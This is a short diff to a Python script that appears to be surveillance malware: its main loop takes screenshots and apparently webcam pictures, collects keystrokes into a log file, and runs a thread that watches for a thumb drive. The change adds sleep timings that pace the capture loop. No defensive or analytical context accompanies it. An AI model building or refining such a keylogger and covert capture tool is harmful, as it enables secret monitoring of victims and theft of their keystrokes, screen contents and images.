@@ -3,6 +3,7 @@ import io
 import os
 import socket
 import threading
+import time
 import zipfile
 from datetime import datetime
 
@@ -123,7 +124,9 @@ if __name__ == "__main__":
         watch_thread = threading.Thread(target=watch_for_thumb_drive)
         watch_thread.start()
         while True:
+            time.sleep(30)
             take_screenshot()
+            time.sleep(0.1)
             take_picture()
             if len(keys) > 50:
                 with open("log.log", "a") as log_file:
